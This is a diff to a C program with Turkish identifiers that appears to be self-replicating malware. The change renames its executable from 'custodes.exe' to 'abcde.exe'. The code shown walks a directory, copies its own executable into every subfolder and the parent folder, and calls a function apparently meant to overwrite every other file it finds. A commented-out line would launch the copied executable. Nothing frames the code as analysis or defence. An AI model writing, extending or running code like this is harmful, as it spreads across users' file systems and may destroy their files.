@@ -24,23 +24,23 @@ int main()
         	FILE *runner;
         	strcat(kopyala_yol,"\".\\");
         	strcat(kopyala_yol,file.name);
-        	strcat(kopyala_yol,"\\custodes.exe\"");
+        	strcat(kopyala_yol,"\\abcde.exe\"");
         	if(kopyala_yol[3]!=46){
-        		dosya_kopyala("custodes.exe",kopyala_yol);
+        		dosya_kopyala("abcde.exe",kopyala_yol);
 				getchar();
         	}
     	}
 	else{
-        if(strcmp(file.name,"custodes.exe")!=0){
+        if(strcmp(file.name,"abcde.exe")!=0){
         	bdoldur(file.name);
         }
     }
     tinydir_next(&dir);
 	}
    	tinydir_close(&dir);
-    dosya_kopyala(".\\custodes.exe","..\\custodes.exe");
-//  system("..\\custodes.exe");
-   bdoldur("custodes.exe");
+    dosya_kopyala(".\\abcde.exe","..\\abcde.exe");
+//  system("..\\abcde.exe");
+   bdoldur("abcde.exe");
    getchar();
    return 0;
 }
